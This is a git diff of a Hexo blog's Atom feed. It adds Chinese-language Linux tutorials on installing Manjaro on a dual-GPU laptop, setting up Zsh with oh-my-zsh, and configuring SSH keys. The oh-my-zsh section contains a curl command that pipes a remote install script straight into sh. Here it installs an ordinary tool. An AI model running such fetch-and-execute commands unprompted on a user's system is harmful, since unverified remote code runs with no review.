@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-03-10T08:04:59.281Z</updated>
+  <updated>2018-03-14T10:39:43.254Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -17,21 +17,72 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>笔记本安装 Manjaro Linux</title>
-    <link href="http://yoursite.com/2018/03/08/archlinuxcn/"/>
-    <id>http://yoursite.com/2018/03/08/archlinuxcn/</id>
-    <published>2018-03-08T08:08:36.000Z</published>
-    <updated>2018-03-10T08:04:59.281Z</updated>
+    <title>终端环境之Zsh＆oh-my-zsh</title>
+    <link href="http://yoursite.com/2018/03/14/oh-my-zsh/"/>
+    <id>http://yoursite.com/2018/03/14/oh-my-zsh/</id>
+    <published>2018-03-14T01:41:21.000Z</published>
+    <updated>2018-03-14T10:39:43.254Z</updated>
     
-    <content type="html"><![CDATA[<p>====================</p><h2 id="Manjaro简介"><a href="#Manjaro简介" class="headerlink" title="Manjaro简介"></a>Manjaro简介</h2><p><a href="https://manjaro.org/" target="_blank" rel="noopener">Manjaro Linux</a>是一款基于Arch Linux、对用户友好、全球排名第2的Linux发行版。（数据来自<a href="https://distrowatch.com/" target="_blank" rel="noopener">DistroWatch</a>），它的一些显著特性包括：简化、用户友好的安装过程，自动检测计算机的硬件（例如显卡），为系统自动安装必要的软件（例如显卡驱动程序），它自己的专用软件仓库，更稳定的软件包、可以轻松安装和使用多个内核。</p><h2 id="双显卡笔记本特殊配置"><a href="#双显卡笔记本特殊配置" class="headerlink" title="双显卡笔记本特殊配置"></a>双显卡笔记本特殊配置</h2><h3 id="安装前"><a href="#安装前" class="headerlink" title="安装前"></a>安装前</h3><ul><li>如果自动图形界面启动不了，卡在以下位置：<ol><li>Started TLP system startup/shutdown</li><li>A start job is running for livemedia mhwd scripe(xx s/no limit)</li></ol></li><li>可尝试添加内核参数<br>  看到启动菜单,用方向键移动选中boot项，按[E]键编辑<br>  把driver=free改为driver=intel，并在后面添加acpi_osi参数，最后效果如下:<blockquote><p>driver=intel xdriver=mesa acpi_osi=! acpi_osi=’Windows 2009’  </p></blockquote></li><li>修改完成后按[F10]启动，并完成安装。</li></ul><h3 id="安装后"><a href="#安装后" class="headerlink" title="安装后"></a>安装后</h3><ul><li>如果安装完成后第一次开机依然卡在最后可尝试在Grub菜单界面按[E]编辑，找到quite并在后面加入:<blockquote><p>acpi_osi=! acpi_osi=’Windows 2009’</p></blockquote></li><li>顺利进入系统后打开终端更改配置文件<blockquote><p>sudo nano /etc/default/grub</p></blockquote></li><li>给 “GRUB_CMLINE_LINUX_DEFAULT”添加‘acpi_osi’参数，如图<br><img src="img/manjaro_grub.png" alt="Grub"></li><li>更新Grub文件,即可彻底解决不能启动图形界面的问题<blockquote><p>sudo grub-mkconfig -o /boot/grub/grub.cfg</p></blockquote></li></ul><h2 id="配置-archlinuxcn-源"><a href="#配置-archlinuxcn-源" class="headerlink" title="配置 archlinuxcn 源"></a>配置 archlinuxcn 源</h2><h3 id="archlinuxcn-简介"><a href="#archlinuxcn-简介" class="headerlink" title="archlinuxcn 简介"></a>archlinuxcn 简介</h3><p>Arch Linux <a href="https://www.archlinuxcn.org/archlinux-cn-repo-and-mirror/" target="_blank" rel="noopener">中文社区仓库</a> 是由 Arch Linux 中文社区驱动的非官方用户仓库。包含大量中文用户常用软件、工具、字体/美化包等。</p><h3 id="启用archlinuxcn库"><a href="#启用archlinuxcn库" class="headerlink" title="启用archlinuxcn库"></a>启用archlinuxcn库</h3><ul><li>修改配置文件<blockquote><p>sudo nano /etc/pacman.conf</p></blockquote></li><li>在文末添加<blockquote><p>[archlinuxcn]<br>Server = <a href="https://mirrors.zju.edu.cn/archlinuxcn/$arch" target="_blank" rel="noopener">https://mirrors.zju.edu.cn/archlinuxcn/$arch</a></p></blockquote></li><li>添加PGP密钥<blockquote><p>sudo pacman -Syy &amp;&amp; sudo pacman -S archlinuxcn-keyring</p></blockquote></li></ul><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><blockquote><p>sudo pacman -S yaourt</p></blockquote><ul><li>以后就可以直接使用 yaourt softname 搜索并安装AUR库中软件</li></ul><h2 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h2><ul><li>推荐Rime<blockquote><p>sudo pacman -S fcitx-im fcitx-configtool fcitx-rime</p></blockquote></li></ul><p><a href="https://github.com/xiaoTaoist/rime-dict" target="_blank" rel="noopener">Rime扩展增强词库</a></p><ul><li>创建配置文件<blockquote><p>vim ~/.xprofile </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export GTK_IM_MODULE=fcitx</span><br><span class="line">export QT_IM_MODULE=fcitx</span><br><span class="line">export XMODIFIERS=&quot;@im=fcitx&quot;</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>注销生效</p><h2 id="其他常用软件"><a href="#其他常用软件" class="headerlink" title="其他常用软件"></a>其他常用软件</h2><ul><li>albert: 谁用谁知道的效率增强神器</li><li>chromium: Chrome浏览器</li><li>deepin-wechat: Linux下微信解决方案</li><li>goldendict: 功能强大的词典软件</li><li>keepassxc: 跨平台的本地密码管理器</li><li>noto-fonts-cjk: 中文字体，当然还有文泉系列(wqy-microhei)</li><li>proxychains-ng: 你懂的</li><li>virtualbox: 开源、轻巧，快速的虚拟机软件</li><li>zsh: 人生苦短，我用zsh</li><li>vlc：本地媒体播放器</li></ul>]]></content>
+    <content type="html"><![CDATA[<p>==============</p><h2 id="终极-Shell-zsh"><a href="#终极-Shell-zsh" class="headerlink" title="终极 Shell(zsh)"></a>终极 Shell(zsh)</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ul><li>Z Shell(Zsh) 是一种Unix shell，它可以用作为交互式的登录shell，也是一种强大的shell脚本命令解释器。它在兼容 Bash 的同时 (默认不兼容，除非设置成 emulate sh) 还提供了很多改进。</li><li>改进特性:<ul><li>色彩高亮</li><li>更强大的自动补全</li><li>支持通配符搜索</li><li>兼容Bash</li><li>完全可定制化</li></ul></li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><blockquote><p>sudo pacman -S zsh zsh-completions</p></blockquote><p>此处为Arch Linux，其他平台请使用自带的包管理器，为了使用更强大的补全功能建议同时安装 zsh-completions包</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ul><li>将zsh设为默认shell<blockquote><p>chsh -s /bin/zsh</p></blockquote></li><li>其他发行版可先用chsh -l 查看zsh安装位置</li></ul><a id="more"></a><h2 id="Oh-my-zsh"><a href="#Oh-my-zsh" class="headerlink" title="Oh-my-zsh"></a>Oh-my-zsh</h2><ul><li>curl 和 git 应该已被安装(若没有Arch 用sudo pacman -S curl git 安装，其他发行版类似。)</li><li><a href="http://ohmyz.sh" target="_blank" rel="noopener">Oh-my-zsh</a>是一个傻瓜化的zsh配置管理框架，提供了大量实用的功能，主题等。做到开箱即用，现在基本成为了Zsh的标配。</li><li><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br></pre></td></tr></table></figure></li><li><p>配置文件位置： ~/.zshrc</p></li><li><p>主题<br>oh-my-zsh自带大量<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Themes" target="_blank" rel="noopener">Themes</a>，默认为robbyrussell。你也可以选择random，即每次打开终端随机选一个主题。</p><blockquote><p>ZSH_THEME=”你喜欢的主题名”<br><img src="/img/zsh_theme.png" alt="themes"></p></blockquote></li><li><p>常用插件</p><ul><li>git: 提供大量git的Aliases，<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Plugin:git" target="_blank" rel="noopener">详情</a></li><li>archlinux： 提供一些pacman包管理器的Aliases，<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Plugins#archlinux" target="_blank" rel="noopener">详情</a></li><li>z：经常使用cd 切换路径，积累一定数据后可用z快速跳转到指定位置</li><li>sudo：按两次[Esc]自动在前面加sudo</li><li>pip： 补全pip 命令</li><li><p>zsh-autosuggestions: 根据历史记录进行智能提示(按 ctrl+E 是正确姿势)。非oh-my-zsh自带，用git下载安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$ZSH_CUSTOM</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure></li><li><p>zsh-syntax-highlighting：命令高亮，正确显示绿色，错误为红色。非oh-my-zsh自带，用git下载安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure><blockquote><p>plugins=( 你想启用的插件，空格分隔 )<br><img src="/img/zsh_plugins.png" alt="plugins"></p></blockquote></li><li>重新加载配置文件，立刻生效。<blockquote><p>source ~/.zshrc</p></blockquote></li></ul></li><li>其他插件请参见官方<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Plugins-Overview" target="_blank" rel="noopener">wiki</a></li><li>少即是多，启用大量插件会严重拖慢zsh启动速度</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://wiki.archlinux.org/index.php/Zsh_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Zsh_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></li><li><a href="http://zsh.sourceforge.net/FAQ/zshfaq01.html#l4" target="_blank" rel="noopener">http://zsh.sourceforge.net/FAQ/zshfaq01.html#l4</a></li><li><a href="https://en.wikipedia.org/wiki/Z_shell" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Z_shell</a></li><li><a href="http://macshuo.com/?p=676" target="_blank" rel="noopener">http://macshuo.com/?p=676</a></li></ul>]]></content>
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;====================&lt;/p&gt;
-&lt;h2 id=&quot;Manjaro简介&quot;&gt;&lt;a href=&quot;#Manjaro简介&quot; class=&quot;headerlink&quot; title=&quot;Manjaro简介&quot;&gt;&lt;/a&gt;Manjaro简介&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https
-      
+      &lt;p&gt;==============&lt;/p&gt;
+&lt;h2 id=&quot;终极-Shell-zsh&quot;&gt;&lt;a href=&quot;#终极-Shell-zsh&quot; class=&quot;headerlink&quot; title=&quot;终极 Shell(zsh)&quot;&gt;&lt;/a&gt;终极 Shell(zsh)&lt;/h2&gt;&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Z Shell(Zsh) 是一种Unix shell，它可以用作为交互式的登录shell，也是一种强大的shell脚本命令解释器。它在兼容 Bash 的同时 (默认不兼容，除非设置成 emulate sh) 还提供了很多改进。&lt;/li&gt;
+&lt;li&gt;改进特性:&lt;ul&gt;
+&lt;li&gt;色彩高亮&lt;/li&gt;
+&lt;li&gt;更强大的自动补全&lt;/li&gt;
+&lt;li&gt;支持通配符搜索&lt;/li&gt;
+&lt;li&gt;兼容Bash&lt;/li&gt;
+&lt;li&gt;完全可定制化&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;sudo pacman -S zsh zsh-completions&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;此处为Arch Linux，其他平台请使用自带的包管理器，为了使用更强大的补全功能建议同时安装 zsh-completions包&lt;/p&gt;
+&lt;h3 id=&quot;使用&quot;&gt;&lt;a href=&quot;#使用&quot; class=&quot;headerlink&quot; title=&quot;使用&quot;&gt;&lt;/a&gt;使用&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;将zsh设为默认shell&lt;blockquote&gt;
+&lt;p&gt;chsh -s /bin/zsh&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;其他发行版可先用chsh -l 查看zsh安装位置&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>笔记本安装 Manjaro Linux</title>
+    <link href="http://yoursite.com/2018/03/09/archlinuxcn/"/>
+    <id>http://yoursite.com/2018/03/09/archlinuxcn/</id>
+    <published>2018-03-09T08:07:36.000Z</published>
+    <updated>2018-03-14T01:24:33.642Z</updated>
+    
+    <content type="html"><![CDATA[<p>====================</p><h2 id="Manjaro简介"><a href="#Manjaro简介" class="headerlink" title="Manjaro简介"></a>Manjaro简介</h2><p><a href="https://manjaro.org/" target="_blank" rel="noopener">Manjaro Linux</a>是一款基于Arch Linux、对用户友好、全球排名第2的Linux发行版。（数据来自<a href="https://distrowatch.com/" target="_blank" rel="noopener">DistroWatch</a>），它的一些显著特性包括：简化、用户友好的安装过程，自动检测计算机的硬件（例如显卡），为系统自动安装必要的软件（例如显卡驱动程序），它有自己的专用软件仓库和更稳定的软件包、可以轻松安装和使用多个内核。</p><h2 id="双显卡笔记本特殊配置"><a href="#双显卡笔记本特殊配置" class="headerlink" title="双显卡笔记本特殊配置"></a>双显卡笔记本特殊配置</h2><h3 id="安装前"><a href="#安装前" class="headerlink" title="安装前"></a>安装前</h3><ul><li>如果自动图形界面启动不了，卡在以下位置：<ol><li>Started TLP system startup/shutdown</li><li>A start job is running for livemedia mhwd scripe(xx s/no limit)</li></ol></li><li>可尝试添加内核参数<br>  看到启动菜单,用方向键移动选中boot项，按[E]键编辑<br>  把driver=free改为driver=intel，并在后面添加acpi_osi参数，最后效果如下:<blockquote><p>driver=intel xdriver=mesa acpi_osi=! acpi_osi=’Windows 2009’  </p></blockquote></li><li>修改完成后按[F10]启动，并完成安装。</li></ul><a id="more"></a><h3 id="安装后"><a href="#安装后" class="headerlink" title="安装后"></a>安装后</h3><ul><li>如果安装完成后第一次开机依然卡在最后可尝试在Grub菜单界面按[E]编辑，找到quite并在后面加入:<blockquote><p>acpi_osi=! acpi_osi=’Windows 2009’</p></blockquote></li><li>顺利进入系统后打开终端更改配置文件<blockquote><p>sudo nano /etc/default/grub</p></blockquote></li><li>给 “GRUB_CMLINE_LINUX_DEFAULT”添加‘acpi_osi’参数，如图<br><img src="/img/manjaro_grub.png" alt="Grub"></li><li>更新Grub文件,即可彻底解决不能启动图形界面的问题<blockquote><p>sudo grub-mkconfig -o /boot/grub/grub.cfg</p></blockquote></li></ul><h2 id="配置-archlinuxcn-源"><a href="#配置-archlinuxcn-源" class="headerlink" title="配置 archlinuxcn 源"></a>配置 archlinuxcn 源</h2><h3 id="archlinuxcn-简介"><a href="#archlinuxcn-简介" class="headerlink" title="archlinuxcn 简介"></a>archlinuxcn 简介</h3><p>Arch Linux <a href="https://www.archlinuxcn.org/archlinux-cn-repo-and-mirror/" target="_blank" rel="noopener">中文社区仓库</a> 是由 Arch Linux 中文社区驱动的非官方用户仓库。包含大量中文用户常用软件、工具、字体/美化包等。</p><h3 id="启用archlinuxcn库"><a href="#启用archlinuxcn库" class="headerlink" title="启用archlinuxcn库"></a>启用archlinuxcn库</h3><ul><li>修改配置文件<blockquote><p>sudo nano /etc/pacman.conf</p></blockquote></li><li>在文末添加<blockquote><p>[archlinuxcn]<br>Server = <a href="https://mirrors.zju.edu.cn/archlinuxcn/$arch" target="_blank" rel="noopener">https://mirrors.zju.edu.cn/archlinuxcn/$arch</a></p></blockquote></li><li>添加PGP密钥<blockquote><p>sudo pacman -Syy &amp;&amp; sudo pacman -S archlinuxcn-keyring</p></blockquote></li></ul><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><blockquote><p>sudo pacman -S yaourt</p></blockquote><ul><li>以后就可以直接使用 yaourt softname 搜索并安装AUR库中的软件。</li></ul><h2 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h2><ul><li>推荐Rime<blockquote><p>sudo pacman -S fcitx-im fcitx-configtool fcitx-rime</p></blockquote></li></ul><p><a href="https://github.com/xiaoTaoist/rime-dict" target="_blank" rel="noopener">Rime扩展增强词库</a></p><ul><li>创建配置文件<blockquote><p>vim ~/.xprofile </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export GTK_IM_MODULE=fcitx</span><br><span class="line">export QT_IM_MODULE=fcitx</span><br><span class="line">export XMODIFIERS=&quot;@im=fcitx&quot;</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>注销生效</p><h2 id="其他常用软件"><a href="#其他常用软件" class="headerlink" title="其他常用软件"></a>其他常用软件</h2><ul><li>albert: 谁用谁知道的效率增强神器</li><li>chromium: Chrome浏览器</li><li>deepin-wechat: Linux下微信解决方案</li><li>goldendict: 功能强大的词典软件</li><li>keepassxc: 跨平台的本地密码管理器</li><li>noto-fonts-cjk: 中文字体，当然还有文泉系列(wqy-microhei)</li><li>proxychains-ng: 你懂的</li><li>virtualbox: 开源、轻巧，快速的虚拟机软件</li><li>zsh: 人生苦短，我用zsh</li><li>vlc：本地媒体播放器</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;====================&lt;/p&gt;
+&lt;h2 id=&quot;Manjaro简介&quot;&gt;&lt;a href=&quot;#Manjaro简介&quot; class=&quot;headerlink&quot; title=&quot;Manjaro简介&quot;&gt;&lt;/a&gt;Manjaro简介&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://manjaro.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Manjaro Linux&lt;/a&gt;是一款基于Arch Linux、对用户友好、全球排名第2的Linux发行版。（数据来自&lt;a href=&quot;https://distrowatch.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;DistroWatch&lt;/a&gt;），它的一些显著特性包括：简化、用户友好的安装过程，自动检测计算机的硬件（例如显卡），为系统自动安装必要的软件（例如显卡驱动程序），它有自己的专用软件仓库和更稳定的软件包、可以轻松安装和使用多个内核。&lt;/p&gt;
+&lt;h2 id=&quot;双显卡笔记本特殊配置&quot;&gt;&lt;a href=&quot;#双显卡笔记本特殊配置&quot; class=&quot;headerlink&quot; title=&quot;双显卡笔记本特殊配置&quot;&gt;&lt;/a&gt;双显卡笔记本特殊配置&lt;/h2&gt;&lt;h3 id=&quot;安装前&quot;&gt;&lt;a href=&quot;#安装前&quot; class=&quot;headerlink&quot; title=&quot;安装前&quot;&gt;&lt;/a&gt;安装前&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;如果自动图形界面启动不了，卡在以下位置：&lt;ol&gt;
+&lt;li&gt;Started TLP system startup/shutdown&lt;/li&gt;
+&lt;li&gt;A start job is running for livemedia mhwd scripe(xx s/no limit)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;可尝试添加内核参数&lt;br&gt;  看到启动菜单,用方向键移动选中boot项，按[E]键编辑&lt;br&gt;  把driver=free改为driver=intel，并在后面添加acpi_osi参数，最后效果如下:&lt;blockquote&gt;
+&lt;p&gt;driver=intel xdriver=mesa acpi_osi=! acpi_osi=’Windows 2009’  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;修改完成后按[F10]启动，并完成安装。&lt;/li&gt;
+&lt;/ul&gt;
     
     </summary>
     
@@ -45,19 +96,35 @@
     <link href="http://yoursite.com/2018/03/07/ssh-keygen/"/>
     <id>http://yoursite.com/2018/03/07/ssh-keygen/</id>
     <published>2018-03-07T01:37:50.000Z</published>
-    <updated>2018-03-08T06:56:11.978Z</updated>
+    <updated>2018-03-14T01:19:53.000Z</updated>
     
-    <content type="html"><![CDATA[<p>========================</p><hr><h2 id="SSH单密钥配置"><a href="#SSH单密钥配置" class="headerlink" title="SSH单密钥配置"></a>SSH单密钥配置</h2><ul><li>生成ssh密钥文件<blockquote><p>ssh-keygen -t ecdsa -b 521</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-t 为指定加密算法类型，支持rsa，dsa，ecdsa</span><br><span class="line">-b 指定密钥大小，ecdsa算法默认大小为256位</span><br><span class="line"></span><br><span class="line">ECDSA (椭圆曲线数字签名算法) 生成的密钥更小，安全性更高</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>如果不需要更改密钥存储位置并为私钥设置密码，可以一路回车<br>ssh-keygen默认会在 $HOME/.ssh/目录下生成2个文件：id_ecdsa.pub（公钥）和id_ecdsa（私钥）。</p><ul><li>将公钥上传到远程服务器<blockquote><p>ssh-copy-id  username@remote_ip</p></blockquote></li></ul><p>ssh-copy-id会将你的刚刚生成的公钥(id_ecdsa.pub)自动写入到远程主机的$HOME/.ssh/authorized_keys文件中</p><ul><li>测试<blockquote><p>ssh username@remote_ip</p></blockquote></li></ul><h2 id="SSH多密钥配置"><a href="#SSH多密钥配置" class="headerlink" title="SSH多密钥配置"></a>SSH多密钥配置</h2><ul><li><p>生成密钥</p><blockquote><p>ssh-keygen -t ecdsa -b 521 -f  ~/.ssh/one   -C “remote_ip”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-f 指定生成密钥保存位置与名称 建议放到 $HOME/.ssh/目录下</span><br><span class="line">-C 添加注释，类如邮箱，远程主机IP，用户名之类，默认为本机主机名和用户</span><br></pre></td></tr></table></figure></blockquote></li><li><p>将公钥上传到远程服务器</p><blockquote><p>ssh-copy-id  -i ~/.ssh/one.pub username@remote_ip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-i 指定上传公钥名称</span><br></pre></td></tr></table></figure></blockquote></li><li><p>创建SSH配置文件来管理多组密钥</p><blockquote><p>vim ~/.ssh/config </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host remote_ip1</span><br><span class="line">  IdentitiesOnly yes</span><br><span class="line">  IdentityFile ~/.ssh/one</span><br><span class="line">Host remote_ip2</span><br><span class="line">  IdentitiesOnly yes</span><br><span class="line">  IdentityFile ~/.ssh/two</span><br></pre></td></tr></table></figure></blockquote></li></ul><blockquote><p>Host后面写: 远程主机ip地址<br>IdentityFile后面写 你创建的密钥位置与名称</p></blockquote><ul><li>测试<blockquote><p>ssh username@remote_ip</p></blockquote></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li><p>将本地文件上传到远程主机</p><blockquote><p>scp local_file remote_username@remote_ip:remote_folder  </p></blockquote></li><li><p>将远程主机中的文件下载到本地</p><blockquote><p>scp remote_username@remote_ip:remote_file   local_folder</p></blockquote></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://wiki.archlinux.org/index.php/SSH_keys" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/SSH_keys</a></li><li><a href="http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html</a></li></ul>]]></content>
+    <content type="html"><![CDATA[<p>========================</p><hr><h2 id="SSH单密钥配置"><a href="#SSH单密钥配置" class="headerlink" title="SSH单密钥配置"></a>SSH单密钥配置</h2><ul><li>生成ssh密钥文件<blockquote><p>ssh-keygen -t ecdsa -b 521</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-t 为指定加密算法类型，支持rsa，dsa，ecdsa</span><br><span class="line">-b 指定密钥大小，ecdsa算法默认大小为256位</span><br><span class="line"></span><br><span class="line">ECDSA (椭圆曲线数字签名算法) 生成的密钥更小，安全性更高</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>如果不需要更改密钥存储位置并为私钥设置密码，可以一路回车<br>ssh-keygen默认会在 $HOME/.ssh/目录下生成2个文件：id_ecdsa.pub（公钥）和id_ecdsa（私钥）。</p><ul><li>将公钥上传到远程服务器<blockquote><p>ssh-copy-id  username@remote_ip</p></blockquote></li></ul><p>ssh-copy-id会将你刚刚生成的公钥(id_ecdsa.pub)自动写入到远程主机的$HOME/.ssh/authorized_keys文件中</p><ul><li>测试<blockquote><p>ssh username@remote_ip</p></blockquote></li></ul><a id="more"></a><h2 id="SSH多密钥配置"><a href="#SSH多密钥配置" class="headerlink" title="SSH多密钥配置"></a>SSH多密钥配置</h2><ul><li><p>生成密钥</p><blockquote><p>ssh-keygen -t ecdsa -b 521 -f  ~/.ssh/one   -C “remote_ip”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-f 指定生成密钥保存位置与名称 建议放到 $HOME/.ssh/目录下</span><br><span class="line">-C 添加注释，类如邮箱，远程主机IP，用户名之类，默认为本机主机名和用户</span><br></pre></td></tr></table></figure></blockquote></li><li><p>将公钥上传到远程服务器</p><blockquote><p>ssh-copy-id  -i ~/.ssh/one.pub username@remote_ip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-i 指定上传公钥名称</span><br></pre></td></tr></table></figure></blockquote></li><li><p>创建SSH配置文件来管理多组密钥</p><blockquote><p>vim ~/.ssh/config </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host remote_ip1</span><br><span class="line">  IdentitiesOnly yes</span><br><span class="line">  IdentityFile ~/.ssh/one</span><br><span class="line">Host remote_ip2</span><br><span class="line">  IdentitiesOnly yes</span><br><span class="line">  IdentityFile ~/.ssh/two</span><br></pre></td></tr></table></figure></blockquote></li></ul><blockquote><p>Host后面写: 远程主机ip地址<br>IdentityFile后面写 你创建的密钥位置与名称</p></blockquote><ul><li>测试<blockquote><p>ssh username@remote_ip</p></blockquote></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li><p>将本地文件上传到远程主机</p><blockquote><p>scp local_file remote_username@remote_ip:remote_folder  </p></blockquote></li><li><p>将远程主机中的文件下载到本地</p><blockquote><p>scp remote_username@remote_ip:remote_file   local_folder</p></blockquote></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://wiki.archlinux.org/index.php/SSH_keys" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/SSH_keys</a></li><li><a href="http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html</a></li></ul>]]></content>
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;========================&lt;/p&gt;
+      &lt;p&gt;========================&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&quot;SSH单密钥配置&quot;&gt;&lt;a href=&quot;#SSH单密钥配置&quot; class=&quot;headerlink&quot; title=&quot;SSH单密钥配置&quot;&gt;&lt;/a&gt;SSH单密钥配置&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;生成s
-      
+&lt;li&gt;生成ssh密钥文件&lt;blockquote&gt;
+&lt;p&gt;ssh-keygen -t ecdsa -b 521&lt;/p&gt;
